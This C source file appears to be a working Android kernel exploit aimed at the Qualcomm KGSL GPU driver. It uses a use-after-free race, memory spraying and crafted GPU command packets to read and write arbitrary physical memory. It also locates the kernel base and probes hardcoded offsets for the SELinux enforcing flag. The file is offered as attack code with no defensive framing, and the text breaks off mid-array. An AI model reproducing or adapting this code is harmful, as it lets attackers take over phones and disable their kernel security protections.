#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>

#define MARKER_NAME "KETO0422"
#define MAX_FOUND_PAGES 1
#define SECOND_CHILD_START 0x900
#define FOUND_PID 0x300
#define SET_TASKS 0x200
#define SEND_ADDR 3
#define GOT_ADDR 4
#define CALL_LOGLINE 0xff0
#define CUR_PID 0xfa0
#define MMAP_CORRUPT_CNT 0x9f8
#define EX_OVER 0xffc
#define TASK_SPRAY_CLEAR 0x901
#define TARGET_PIDPID 0x40

char *gbuf;
int fd;
int fd2;
int fd_lib;
int fd_shellcode;
struct stat st;
char check_flag[100] = {
    0,
};
unsigned long long gb_target_addr;
uint64_t selinux_enforcing;
uint64_t kernel_base = 0;
unsigned int g_uaf_id = 0;
uint64_t g_uaf_mmapsize = 0;
void *g_uaf_mmap_ptr = NULL;

static void flush_icache(void *addr, size_t len)
{
    __builtin___clear_cache((char *)addr, (char *)addr + len);
    __sync_synchronize();
}

static void log_access_context(const char *stage, const char *path, const char *detail, int cpu_core, unsigned gpu_ctx_id)
{
    const char *cpu_role = "general CPU core";
    const char *gpu_role = gpu_ctx_id ? "KGSL compute/context path" : "no GPU context";
    fprintf(stderr,
            "[TRACE] stage=%s | path=%s | detail=%s | cpu_core=%d | cpu_role=%s | gpu_ctx=%u | gpu_role=%s\n",
            stage, path, detail, cpu_core, cpu_role, gpu_ctx_id, gpu_role);
}

static void log_cpu_cache_path(const char *stage, const char *detail)
{
    int cpu_core = sched_getcpu();
    fprintf(stderr,
            "[TRACE] stage=%s | path=CPU->L1/L2/L3/L4->DRAM | detail=%s | cpu_core=%d | cpu_role=general CPU core | note=kernel-mediated; cache level is not directly selectable from userland\n",
            stage, detail, cpu_core);
}

static void interleave_gpu_cpu_paths(void)
{
    sched_yield();
    usleep(1000);
}

static void log_timing_window(const char *phase, const char *path, int attempt, unsigned int delay_us)
{
    int cpu_core = sched_getcpu();
    fprintf(stderr,
            "[TOCTOU] phase=%s | path=%s | attempt=%d | delay_us=%u | cpu_core=%d | note=small window between check-and-use to expose race\n",
            phase, path, attempt, delay_us, cpu_core);
}

static void delay_timing_window(unsigned int delay_us)
{
    struct timespec ts;
    ts.tv_sec = delay_us / 1000000U;
    ts.tv_nsec = (delay_us % 1000000U) * 1000U;
    nanosleep(&ts, NULL);
}

static void log_sync_state(const char *stage)
{
    fprintf(stderr,
            "[SYNC] stage=%s | FOUND_PID=0x%x | TASK_SPRAY_CLEAR=0x%x\n",
            stage, (unsigned int)gbuf[FOUND_PID], (unsigned int)gbuf[TASK_SPRAY_CLEAR]);
}

static uint64_t find_kernel_base_from_task_struct(uint64_t task_va);

#define WAIT_STEP_US 1000
#define WAIT_TIMEOUT_MS 60000

static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

static int wait_for_flag_u64(volatile uint64_t *ptr, uint64_t value, unsigned int timeout_ms)
{
    unsigned int waited = 0;
    while (*ptr != value && waited < timeout_ms)
    {
        usleep(WAIT_STEP_US);
        waited += WAIT_STEP_US / 1000;
    }
    return *ptr == value;
}

uint8_t sig_num[] = {1, 3, 5, 7, 9};

#define KGSL_IOC_TYPE 0x09
#define FINDING 1
#define SPRAY_COUNT 10000
#define SPRAY_COUNT_STEP 2000
#define SPRAY_COUNT_MAX 4000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR 0x00000002U

typedef struct
{
    pid_t pid;
    int do_action;
} spray_slot_t;

static spray_slot_t *spray_ctrl;
static int spray_count = SPRAY_COUNT;

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem
{
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)

#define DEV_PATH "/dev/kgsl-3d0"
#define PAGE_SIZE 4096

#define UAF_START 0x00000007001ff000ULL
#define UAF_SIZE 0x0000000010004000ULL
#define UAF_SCAN_SIZE 0x0000000004000000ULL
#define SCAN_PAGE_STEP 8U
#define SCAN_MAX_PAGES 512U
#define SCAN_PROGRESS_EVERY 64U
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE 0x0000000000007000ULL
#define PLACEH_START 0x0000000710204000ULL
#define PLACEH_SIZE 0x0000000000010000ULL
#define BOGUS_START 0x0000000700204000ULL
#define WRAP_SIZE 0xffffffffffefd000ULL

typedef struct
{
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;
} race_state_t;

#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

struct kgsl_drawctxt_create
{
    unsigned flags, drawctxt_id;
};

struct kgsl_command_object
{
    uint64_t offset, gpuaddr, size;
    unsigned flags, id;
};

struct kgsl_gpu_command
{
    uint64_t flags, cmdlist;
    unsigned cmdsize, numcmds;
    uint64_t objlist;
    unsigned objsize, numobjs;
    uint64_t synclist;
    unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid
{
    unsigned context_id, type, timestamp;
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr, flags, size, va_len, va_addr;
    unsigned id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) &
           1u;
}

#define MMAP_SPRAY_COUNT 4000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL

#define PAGE_SHIFT 12
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define PMD_SHIFT 21
#define PGDIR_SHIFT 30
#define PTRS_PER_PTE 512
#define PTRS_PER_PMD 512
#define PTRS_PER_PGD 512
#define PHYS_MASK ((1ULL << 48) - 1)

typedef struct
{
    uint64_t pgd;
} pgd_t;
typedef struct
{
    uint64_t pmd;
} pmd_t;
typedef struct
{
    uint64_t pte;
} pte_t;

#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define pgd_val(x) ((x).pgd)
#define pmd_val(x) ((x).pmd)
#define pte_val(x) ((x).pte)

#define PTE_SAVE_BASE 0xf00

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
{
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id;
    r.type = KGSL_TIMESTAMP_RETIRED;

    for (unsigned spins = 0; spins < 100000; ++spins)
    {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;

    uintptr_t alt_addrs[9];
    alt_addrs[0] = (uintptr_t)fixed_addr;
    alt_addrs[1] = 0x70000000ULL;
    alt_addrs[2] = 0x70010000ULL;
    alt_addrs[3] = 0x70020000ULL;
    alt_addrs[4] = 0x71000000ULL;
    alt_addrs[5] = 0x6f000000ULL;
    alt_addrs[6] = 0x6ff00000ULL;
    alt_addrs[7] = 0x72000000ULL;
    alt_addrs[8] = 0x6e000000ULL;

    for (size_t i = 0; i < sizeof(alt_addrs) / sizeof(alt_addrs[0]); ++i)
    {
        int flags = MAP_SHARED | MAP_FIXED;
#ifdef MAP_FIXED_NOREPLACE
        flags = MAP_SHARED | MAP_FIXED_NOREPLACE;
#endif
        void *p = mmap((void *)alt_addrs[i], len, PROT_READ | PROT_WRITE, flags, fd, offset);
        if (p != MAP_FAILED)
        {
            if ((uintptr_t)p != alt_addrs[i])
                fprintf(stderr, "[MMAP] requested=0x%llx got=%p\n",
                        (unsigned long long)alt_addrs[i], p);
            return p;
        }

        int err = errno;
        if (err != ENOMEM && err != EAGAIN && err != EEXIST && err != EINVAL)
            break;
    }

    fprintf(stderr, "[MMAP] fixed mapping failed for id=%u size=0x%llx, trying anonymous fallback\n",
            id, (unsigned long long)mmapsize);
    return mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
}

static void *mmap_gpuobj_fixed_strict(int fd, unsigned int id, uint64_t mmapsize, void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;
    int flags = MAP_SHARED | MAP_FIXED;
#ifdef MAP_FIXED_NOREPLACE
    flags = MAP_SHARED | MAP_FIXED_NOREPLACE;
#endif
    return mmap(fixed_addr, len, PROT_READ | PROT_WRITE, flags, fd, offset);
}

static int gpu_write_phys(int fd, uint64_t phys_addr, uint32_t value)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_WRITE] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_WRITE] start phys=0x%llx value=0x%x\n", phys_addr, value);
    log_access_context("GPU_WRITE", "GPU->DRAM", "issuing KGSL command buffer to physical write", sched_getcpu(), 0);

    unsigned ctx_id = 0, ib_id = 0;
    uint64_t ib_gpu = 0;
    void *ib_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_WRITE] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_WRITE] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    uint32_t d_lo, d_hi;
    split64(phys_addr, &d_lo, &d_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = value;

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        result = 0;
        fprintf(stderr, "[GPU_WRITE] success phys=0x%llx value=0x%x\n", phys_addr, value);
    }
    else
    {
        fprintf(stderr, "[GPU_WRITE] failed phys=0x%llx value=0x%x\n", phys_addr, value);
    }

cleanup:
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return result;
}

static int gpu_write_phys_64(int fd, uint64_t phys_addr, uint64_t value)
{
    int ret = 0;
    ret |= gpu_write_phys(fd, phys_addr, (uint32_t)(value & 0xffffffff));
    ret |= gpu_write_phys(fd, phys_addr + 4, (uint32_t)(value >> 32));
    return ret;
}

// ================== ЧТЕНИЕ ФИЗИЧЕСКОЙ ПАМЯТИ ЧЕРЕЗ GPU ==================
static int gpu_read_phys(int fd, uint64_t phys_addr, uint8_t *buffer, size_t size)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Invalid fd: %d\n", fd);
        return -1;
    }

    fprintf(stderr, "[GPU_READ_PHYS] start phys=0x%llx size=%zu\n", phys_addr, size);
    log_access_context("GPU_READ_PHYS", "GPU->DRAM", "issuing KGSL read from physical memory", sched_getcpu(), 0);

    if (size > 4096)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Size too large: %zu, limiting to 4096\n", size);
        size = 4096;
    }

    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ_PHYS] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);
    memset(dst_vma, 0, dst_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    if (dwords > 256)
    {
        fprintf(stderr, "[GPU_READ_PHYS] Too many dwords: %d, limiting to 256\n", dwords);
        dwords = 256;
    }

    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(phys_addr + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, dst_vma, size);
        result = 0;
        fprintf(stderr, "[GPU_READ_PHYS] success phys=0x%llx size=%zu first8=0x%llx\n", phys_addr, size,
                size >= 8 ? *(uint64_t *)buffer : 0ULL);
    }
    else
    {
        fprintf(stderr, "[GPU_READ_PHYS] failed phys=0x%llx size=%zu\n", phys_addr, size);
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return result;
}

static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size)
{
    if (fd < 0)
    {
        fprintf(stderr, "[GPU_READ] Invalid fd: %d\n", fd);
        return -1;
    }

    if (size > 4096)
    {
        fprintf(stderr, "[GPU_READ] Size too large: %zu, limiting to 4096\n", size);
        size = 4096;
    }

    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int result = -1;

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[GPU_READ] Failed to create context\n");
        return -1;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 4,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "[GPU_READ] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "[GPU_READ] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_alloc.mmapsize);
    memset(dst_vma, 0, dst_alloc.mmapsize);

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    int dwords = size / 4;
    if (dwords > 256)
    {
        fprintf(stderr, "[GPU_READ] Too many dwords: %d, limiting to 256\n", dwords);
        dwords = 256;
    }

    for (int i = 0; i < dwords; i++)
    {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
        split64(task_va + (uint64_t)i * 4, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
    }

    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    size_t ib_bytes = (size_t)dw * 4;
    msync(ib_vma, ib_bytes, MS_SYNC);

    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu,
        .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id};

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    gpu_cmd.cmdsize = sizeof(obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = ctx_id;

    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
        memcpy(buffer, dst_vma, size);
        result = 0;
        fprintf(stderr, "[GPU_READ] Successfully read %zu bytes from 0x%llx\n", size, task_va);
    }
    else
    {
        fprintf(stderr, "[GPU_READ] GPU command failed for 0x%llx\n", task_va);
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return result;
}

static int check_selinux_status(void)
{
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0)
    {
        return -1;
    }
    char val = 0;
    if (read(fd, &val, 1) != 1)
    {
        close(fd);
        return -1;
    }
    close(fd);
    return val;
}

// ================== АВТОМАТИЧЕСКИЙ ПОИСК KERNEL BASE ==================
static uint64_t find_kernel_base_from_kallsyms(void)
{
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp)
        return 0;

    char line[512];
    while (fgets(line, sizeof(line), fp))
    {
        char *addr_str = strtok(line, " \t");
        char *type = strtok(NULL, " \t");
        char *name = strtok(NULL, " \t");
        if (!addr_str || !type || !name)
            continue;

        if (strcmp(type, "T") != 0 && strcmp(type, "t") != 0 && strcmp(type, "W") != 0)
            continue;

        if (strcmp(name, "_text") == 0 || strcmp(name, "_stext") == 0 || strcmp(name, "stext") == 0 ||
            strcmp(name, "__start_rodata") == 0)
        {
            unsigned long long addr = 0;
            if (sscanf(addr_str, "%llx", &addr) == 1)
            {
                fclose(fp);
                if (addr >= 0xffffffc000000000ULL && addr <= 0xfffffff000000000ULL)
                    return (addr & 0xFFFFFFFF00000000ULL);
                return (addr & 0xFFFFFFFFFFFFF000ULL);
            }
        }
    }

    fclose(fp);
    return 0;
}

static uint64_t find_kernel_base_from_maps(void)
{
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp)
        return 0;

    char line[512];
    while (fgets(line, sizeof(line), fp))
    {
        if (strstr(line, "system") != NULL && strstr(line, "lib") != NULL)
        {
            unsigned long long start = 0;
            if (sscanf(line, "%llx-%*llx", &start) == 1)
            {
                fclose(fp);
                if (start >= 0xffffffc000000000ULL && start <= 0xfffffff000000000ULL)
                    return (start & 0xFFFFFFFF00000000ULL);
            }
        }
    }

    fclose(fp);
    return 0;
}

static uint64_t find_kernel_base_from_iomem(void)
{
    FILE *fp = fopen("/proc/iomem", "r");
    if (!fp)
        return 0;

    char line[512];
    while (fgets(line, sizeof(line), fp))
    {
        if (strstr(line, "Kernel") != NULL || strstr(line, "System RAM") != NULL)
        {
            unsigned long long start = 0;
            if (sscanf(line, "%llx", &start) == 1)
            {
                fclose(fp);
                if (start >= 0xffffffc000000000ULL && start <= 0xfffffff000000000ULL)
                    return (start & 0xFFFFFFFF00000000ULL);
            }
        }
    }

    fclose(fp);
    return 0;
}

static uint64_t find_kernel_base_from_modules(void)
{
    DIR *dir = opendir("/sys/module");
    if (!dir)
        return 0;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL)
    {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char path[512];
        snprintf(path, sizeof(path), "/sys/module/%s/sections/.text", ent->d_name);
        FILE *fp = fopen(path, "r");
        if (!fp)
            continue;

        unsigned long long addr = 0;
        if (fscanf(fp, "%llx", &addr) == 1 && addr != 0)
        {
            closedir(dir);
            fclose(fp);
            if (addr >= 0xffffffc000000000ULL && addr <= 0xfffffff000000000ULL)
                return (addr & 0xFFFFFFFF00000000ULL);
            return (addr & 0xFFFFFFFFFFFFF000ULL);
        }
        fclose(fp);
    }

    closedir(dir);
    return 0;
}

static uint64_t find_kernel_base_auto(void)
{
    uint64_t base = 0;

    base = find_kernel_base_from_kallsyms();
    if (base)
        return base;

    base = find_kernel_base_from_maps();
    if (base)
        return base;

    uint64_t task_va = *(uint64_t *)&gbuf[0xb08];
    if (task_va)
    {
        base = find_kernel_base_from_task_struct(task_va);
        if (base)
            return base;
    }

    base = find_kernel_base_from_iomem();
    if (base)
        return base;

    base = find_kernel_base_from_modules();
    if (base)
        return base;

    uint64_t standard_bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
    };

    for (int i = 0; i < 4; i++)
    {
        uint64_t test_selinux = standard_bases[i] + 0x2F74CE8;
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
                return standard_bases[i];
        }
    }

    return 0;
}

static uint64_t find_offsets_auto(uint64_t kernel_base)
{
    uint64_t selinux_offsets[] = {
        0x2F74CE8,
        0x2A8FCE8,
        0x2B8FCE8,
        0x2D8FCE8,
        0x2E8FCE8,
        0x2C8FCE8,
        0x2F4FCE8,
